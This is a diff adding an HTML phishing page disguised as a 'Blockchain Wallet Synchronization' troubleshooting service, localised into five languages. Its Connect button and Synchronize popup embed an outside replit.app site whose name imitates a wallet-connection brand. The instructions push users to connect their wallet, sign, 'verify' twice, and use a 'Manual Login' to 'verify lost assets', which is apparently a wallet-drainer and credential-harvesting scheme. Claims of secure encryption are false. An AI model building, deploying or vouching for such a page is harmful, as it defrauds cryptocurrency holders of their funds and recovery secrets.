@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Blockchain Wallet Synchronization</title>
+
+<style>
+    body {
+        margin: 0;
+        font-family: Arial, sans-serif;
+        background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+        color: #fff;
+        text-align: center;
+    }
+
+    header {
+        padding: 40px 20px;
+        position: relative;
+    }
+
+    h1 {
+        font-size: 32px;
+        margin-bottom: 10px;
+    }
+
+    p {
+        color: #ccc;
+        max-width: 600px;
+        margin: auto;
+    }
+
+    .container {
+        max-width: 800px;
+        margin: 40px auto;
+        padding: 20px;
+        background: rgba(255,255,255,0.05);
+        border-radius: 10px;
+        box-shadow: 0 0 20px rgba(0,0,0,0.3);
+    }
+
+    ul {
+        text-align: left;
+        padding-left: 20px;
+        line-height: 1.8;
+    }
+
+    li {
+        margin-bottom: 10px;
+    }
+
+    .sync-btn {
+        margin-top: 30px;
+        padding: 15px 40px;
+        font-size: 18px;
+        border: none;
+        border-radius: 30px;
+        cursor: pointer;
+        background: linear-gradient(to right, #00c6ff, #0072ff);
+        color: #fff;
+        transition: 0.3s;
+    }
+
+    .sync-btn:hover {
+        opacity: 0.85;
+    }
+
+    .go-wallet-btn {
+        padding:10px 20px;
+        background:#6f42c1;
+        color:white;
+        border:none;
+        border-radius:6px;
+        cursor:pointer;
+        margin-top:10px;
+    }
+
+    footer {
+        margin-top: 40px;
+        padding: 20px;
+        font-size: 14px;
+        color: #aaa;
+    }
+
+    .connect-btn {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      padding: 12px 24px;
+      background: linear-gradient(90deg, #4CAF50, #00D1FF);
+      color: white;
+      font-weight: bold;
+      border-radius: 8px;
+      text-decoration: none;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+      transition: all 0.3s ease;
+      z-index: 9999;
+    }
+
+    .connect-btn:hover {
+      transform: scale(1.1);
+      box-shadow: 0 6px 18px rgba(0,0,0,0.3);
+    }
+
+    /* Popup */
+    .popup {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.7);
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+
+    .popup-content {
+      width: 500px;
+      height: 600px;
+      background: #ffffff;
+      border-radius: 12px;
+      position: relative;
+      overflow: hidden;
+      animation: fadeIn 0.3s ease-in-out;
+    }
+
+    .popup-content iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
+
+    .close-btn {
+      position: absolute;
+      top: 10px;
+      right: 15px;
+      font-size: 22px;
+      cursor: pointer;
+      z-index: 10;
+    }
+
+    @keyframes fadeIn {
+      from { transform: scale(0.9); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+
+    .wallet-guidelines {
+        margin-top: 30px;
+        text-align: left;
+    }
+
+    /* Language Selector */
+    #lang-select {
+        position: absolute;
+        top: 20px;
+        left: 20px;
+        padding: 8px 12px;
+        border-radius: 6px;
+        border: none;
+        font-weight: bold;
+        cursor: pointer;
+        background: #0072ff;
+        color: white;
+    }
+</style>
+</head>
+
+<body>
+
+<header>
+    <select id="lang-select" onchange="switchLanguage()">
+        <option value="auto">🌐 Auto</option>
+        <option value="en">English</option>
+        <option value="es">Español</option>
+        <option value="tr">Türkçe</option>
+        <option value="zh">中文</option>
+        <option value="hi">हिन्दी</option>
+    </select>
+
+    <h1 id="title">Blockchain Wallet Synchronization</h1>
+    <p id="subtitle">Securely synchronize your crypto wallet with the blockchain network to resolve errors and restore full functionality.</p>
+</header>
+
+<a href="https://reownrelpit--johncenafans79.replit.app" class="connect-btn" id="connect-btn">Connect</a>
+
+<div class="container">
+    <h2 id="common-issues-title">Common Wallet Issues</h2>
+    <ul id="common-issues-list">
+        <li>Wallet balance not updating</li>
+        <li>Pending or stuck transactions</li>
+        <li>Token not displaying in wallet</li>
+        <li>Network synchronization delay</li>
+        <li>Incorrect gas fee estimation</li>
+        <li>Smart contract interaction failure</li>
+        <li>Node connection timeout</li>
+        <li>Wallet address mismatch</li>
+    </ul>
+
+    <div class="wallet-guidelines">
+        <h2 id="guidelines-title">Guidelines for Synchronized Wallet</h2>
+        <ul id="guidelines-list">
+            <li>once tapped synchronization wait for page load and tap on connect wallet.</li>
+            <li>Confirm you are connected to the correct blockchain network on your wallet.</li>
+            <li>return back here and tap sign</li>
+            <li>Wait for signing to complete before refreshing.</li>
+            <li>Then tap on Verify eth wallet twice 2ce</li>
+        </ul>
+    </div>
+
+    <button class="sync-btn" onclick="openPopup()" id="sync-btn">Synchronize Wallet</button>
+</div>
+
+<p id="guide-text" style="margin-top:20px;">To Verify lost assets use Manual Login</p>
+
+<button class="go-wallet-btn" onclick="window.location.href='manual.html';" id="go-wallet-btn">MANUAL LOGIN</button>
+
+<footer>
+    © 2026 Blockchain Network | Secure Protocol Encryption
+</footer>
+
+<div id="popupModal" class="popup">
+  <div class="popup-content">
+    <span class="close-btn" onclick="closePopup()">&times;</span>
+    <iframe src="https://reownrelpit--johncenafans79.replit.app"></iframe>
+  </div>
+</div>
+
+<script>
+function openPopup() {
+  document.getElementById("popupModal").style.display = "flex";
+}
+function closePopup() {
+  document.getElementById("popupModal").style.display = "none";
+}
+window.onclick = function(event) {
+  const modal = document.getElementById("popupModal");
+  if (event.target === modal) modal.style.display = "none";
+}
+
+/* Multi-language support */
+const translations = {
+    en: { 
+        title:"Blockchain Wallet Synchronization",
+        subtitle:"Securely synchronize your crypto wallet with the blockchain network to resolve errors and restore full functionality.",
+        connect:"Connect",
+        commonIssuesTitle:"Common Wallet Issues",
+        commonIssuesList:["Wallet balance not updating","Pending or stuck transactions","Token not displaying in wallet","Network synchronization delay","Incorrect gas fee estimation","Smart contract interaction failure","Node connection timeout","Wallet address mismatch"],
+        guidelinesTitle:"Guidelines for Synchronized Wallet",
+        guidelinesList:["once tapped synchronization wait for page load and tap on connect wallet.","Confirm you are connected to the correct blockchain network on your wallet.","return back here and tap sign","Wait for signing to complete before refreshing.","Then tap on Verify eth wallet twice 2ce"],
+        syncBtn:"Synchronize Wallet",
+        guideText:"To Verify lost assets use Manual Login",
+        goWalletBtn:"MANUAL LOGIN"
+    },
+    es: {
+        title:"Sincronización de Billetera Blockchain",
+        subtitle:"Sincronice su billetera cripto con la red blockchain de forma segura.",
+        connect:"Conectar",
+        commonIssuesTitle:"Problemas Comunes de la Billetera",
+        commonIssuesList:["El saldo de la billetera no se actualiza","Transacciones pendientes o bloqueadas","Token no se muestra en la billetera","Retraso en la sincronización de la red","Estimación incorrecta de tarifas de gas","Fallo en la interacción con contratos inteligentes","Tiempo de espera de conexión al nodo","Desajuste de dirección de la billetera"],
+        guidelinesTitle:"Guía para Billetera Sincronizada",
+        guidelinesList:["Una vez que se toque la sincronización, espere a que se cargue la página y toque conectar billetera.","Confirme que está conectado a la red blockchain correcta en su billetera.","Regrese aquí y toque firmar","Espere a que la firma se complete antes de actualizar.","Luego toque Verificar billetera Ethereum dos veces"],
+        syncBtn:"Sincronizar Billetera",
+        guideText:"Para verificar activos perdidos, use el inicio de sesión manual",
+        goWalletBtn:"INICIO DE SESIÓN MANUAL"
+    },
+    tr: {
+        title:"Blockchain Cüzdan Senkronizasyonu",
+        subtitle:"Kripto cüzdanınızı blockchain ağı ile güvenli şekilde senkronize edin.",
+        connect:"Bağlan",
+        commonIssuesTitle:"Yaygın Cüzdan Sorunları",
+        commonIssuesList:["Cüzdan bakiyesi güncellenmiyor","Bekleyen veya takılı işlemler","Token cüzdanda görüntülenmiyor","Ağ senkronizasyon gecikmesi","Yanlış gas ücreti tahmini","Akıllı sözleşme etkileşim hatası","Düğüm bağlantısı zaman aşımına uğradı","Cüzdan adresi uyuşmazlığı"],
+        guidelinesTitle:"Senkronize Cüzdan Kuralları",
+        guidelinesList:["Senkronizasyonu tıkladıktan sonra sayfanın yüklenmesini bekleyin ve cüzdanı bağlayın.","Cüzdanınızda doğru blockchain ağına bağlı olduğunuzu doğrulayın.","Buraya geri dönün ve imzala'ya dokunun","İmzalama tamamlanana kadar bekleyin","Sonra Ethereum cüzdanını iki kez doğrulayın"],
+        syncBtn:"Cüzdanı Senkronize Et",
+        guideText:"Kayıp varlıkları doğrulamak için Manuel Giriş kullanın",
+        goWalletBtn:"MANUEL GİRİŞ"
+    },
+    zh: {
+        title:"区块链钱包同步",
+        subtitle:"安全地将您的加密钱包与区块链网络同步。",
+        connect:"连接",
+        commonIssuesTitle:"常见钱包问题",
+        commonIssuesList:["钱包余额未更新","待处理或卡住的交易","代币未显示在钱包中","网络同步延迟","错误的燃气费估算","智能合约交互失败","节点连接超时","钱包地址不匹配"],
+        guidelinesTitle:"同步钱包指南",
+        guidelinesList:["点击同步后，等待页面加载并点击连接钱包。","确认您的钱包已连接到正确的区块链网络。","返回此页面并点击签名","在刷新前等待签名完成","然后点击验证以太坊钱包两次"],
+        syncBtn:"同步钱包",
+        guideText:"要验证丢失的资产，请使用手动登录",
+        goWalletBtn:"手动登录"
+    },
+    hi: {
+        title:"ब्लॉकचेन वॉलेट सिंक्रोनाइज़ेशन",
+        subtitle:"अपने क्रिप्टो वॉलेट को सुरक्षित रूप से ब्लॉकचेन नेटवर्क से सिंक्रोनाइज़ करें।",
+        connect:"कनेक्ट करें",
+        commonIssuesTitle:"सामान्य वॉलेट समस्याएँ",
+        commonIssuesList:["वॉलेट बैलेंस अपडेट नहीं हो रहा","लंबित या फंसी हुई लेनदेन","टोकन वॉलेट में प्रदर्शित नहीं हो रहा","नेटवर्क सिंक्रोनाइज़ेशन में देरी","गलत गैस शुल्क अनुमान","स्मार्ट कॉन्ट्रैक्ट इंटरैक्शन विफल","नोड कनेक्शन टाइमआउट","वॉलेट पता असंगतता"],
+        guidelinesTitle:"सिंक्रोनाइज़्ड वॉलेट दिशानिर्देश",
+        guidelinesList:["सिंक पर टैप करने के बाद पेज लोड का इंतजार करें और कनेक्ट वॉलेट पर टैप करें।","पुष्टि करें कि आपका वॉलेट सही ब्लॉकचेन नेटवर्क से जुड़ा है।","यहाँ वापस आएं और साइन पर टैप करें","रिफ्रेश करने से पहले साइनिंग पूरी होने का इंतजार करें।","फिर ETH वॉलेट को दो बार सत्यापित करें"],
+        syncBtn:"वॉलेट सिंक्रोनाइज़ करें",
+        guideText:"खोई हुई संपत्ति को सत्यापित करने के लिए मैनुअल लॉगिन का उपयोग करें",
+        goWalletBtn:"मैनुअल लॉगिन"
+    }
+};
+
+function detectLanguage() {
+    let userLang = navigator.language.slice(0,2);
+    if(!translations[userLang]) userLang = "en";
+    return userLang;
+}
+
+function applyLanguage(langCode) {
+    if(langCode==="auto") langCode = detectLanguage();
+    const t = translations[langCode];
+
+    document.getElementById("title").innerText = t.title;
+    document.getElementById("subtitle").innerText = t.subtitle;
+    document.getElementById("connect-btn").innerText = t.connect;
+    document.getElementById("common-issues-title").innerText = t.commonIssuesTitle;
+
+    const ciList = document.getElementById("common-issues-list");
+    ciList.innerHTML = "";
+    t.commonIssuesList.forEach(item=>{
+        const li=document.createElement("li");
+        li.innerText=item;
+        ciList.appendChild(li);
+    });
+
+    document.getElementById("guidelines-title").innerText = t.guidelinesTitle;
+    const glList = document.getElementById("guidelines-list");
+    glList.innerHTML="";
+    t.guidelinesList.forEach(item=>{
+        const li=document.createElement("li");
+        li.innerText=item;
+        glList.appendChild(li);
+    });
+
+    document.getElementById("sync-btn").innerText = t.syncBtn;
+    document.getElementById("guide-text").innerText = t.guideText;
+    document.getElementById("go-wallet-btn").innerText = t.goWalletBtn;
+}
+
+function switchLanguage() {
+    const select = document.getElementById("lang-select");
+    applyLanguage(select.value);
+}
+
+// Initialize page language automatically
+applyLanguage("auto");
+</script>
+
+</body>
+</html>
